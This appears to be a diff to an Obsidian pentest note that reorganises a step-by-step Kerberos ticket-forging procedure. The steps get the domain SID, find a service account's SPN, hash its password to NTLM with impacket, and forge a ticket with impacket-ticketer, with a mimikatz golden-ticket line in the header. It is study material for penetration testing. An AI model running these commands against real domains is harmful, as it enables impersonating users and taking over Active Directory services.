@@ -21,11 +21,11 @@ kerberos::golden /domain:domain.local /sid:<DOMAIN_SID> /target:FILE01.domain.lo
 
 ---
 
-### **Windows— User shell**
+### **Step 1 : Get domain SID**
 
-Get domain SID
+(Windows) User shell  : Get domain SID
 ```dataviewjs
-const command = "get-addomain";
+const command = "get-addomain | Select-Object DomainSID";
 
 const button = dv.container.createEl("button", {
     text: command
@@ -48,6 +48,37 @@ button.addEventListener("click", async () => {
     setTimeout(() => button.textContent = command, 1000);
 });
 ```
+
+Or from KALI
+```dataviewjs
+const command = "impacket-lookupsid domain.local/user:Password123!@<DC_IP>";
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 1000);
+});
+```
+
+Or use the domain SID shown in BloodHound/domain enumeration.
+
+---
+### **Step 2 : Get SPN of svc account**
 
 Get the**Service Principal Name (SPN)** of the SQL Server account
 ```dataviewjs
@@ -75,8 +106,43 @@ button.addEventListener("click", async () => {
 });
 ```
 
-### **Kali — Impacket**
+---
+### **Step 3 : Convert plaintext to NTLM**
 
+Replace the {Service1} with password
+```dataviewjs
+const command = `python3 -c 'from impacket.ntlm import compute_nthash; print(compute_nthash("Service1").hex())'`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 1000);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+---
+### **Step 4 : Use ticketer**
+
+Kali — Impacket
 ```
 impacket-ticketer \
 -nthash <SERVICE_ACCOUNT_HASH> \
@@ -120,13 +186,7 @@ For the domain SID:
 Get-ADDomain | Select-Object DomainSID
 ```
 
-### **Kali — Impacket**
 
-```
-impacket-lookupsid domain.local/user:Password123!@<DC_IP>
-```
-
-Or use the domain SID shown in BloodHound/domain enumeration.
 
 ---
 
